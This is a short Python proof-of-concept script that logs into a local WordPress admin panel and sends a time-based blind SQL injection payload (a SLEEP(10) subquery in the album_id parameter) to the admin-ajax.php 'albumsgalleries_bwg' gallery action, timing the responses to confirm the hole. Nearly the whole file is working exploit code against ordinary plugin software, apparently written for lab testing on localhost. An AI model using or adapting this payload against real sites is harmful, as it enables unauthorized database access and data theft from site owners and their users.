import mechanicalsoup
from bs4 import BeautifulSoup

# enter root folder
print('Enter the name of the root folder of wordpress in htdocs (e.g. wordpress): ')
wordpressinfo = input()
URL = "http://localhost/" + wordpressinfo + "/wp-admin/"
TargetURL = "http://localhost/" + wordpressinfo + "/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=0 AND (SELECT * FROM (SELECT(SLEEP(10)))a)&width=785&height=550&bwg_nonce=9e367490cc&"

# enter credentials
print('Enter username: ')
usernameinput = input()
print('Enter password: ')
passwordinput = input()

# create a browser object
browser = mechanicalsoup.StatefulBrowser()

browser.open(URL)

# we grab the login form
browser.select_form('form[name="loginform"]')

# specify username and password

browser["log"] = usernameinput
browser["pwd"] = passwordinput

# submit form
response = browser.submit_selected()

    
# Calculating time before SQL injection
	
print("Rsponse time:")
print (response.elapsed.total_seconds())

# Injecting malicious code and calculate time after SQL injection

print("Injecting malicious code")
print("Waiting for browser response...")
response = browser.open(TargetURL)

print("Response time:")
print (response.elapsed.total_seconds())












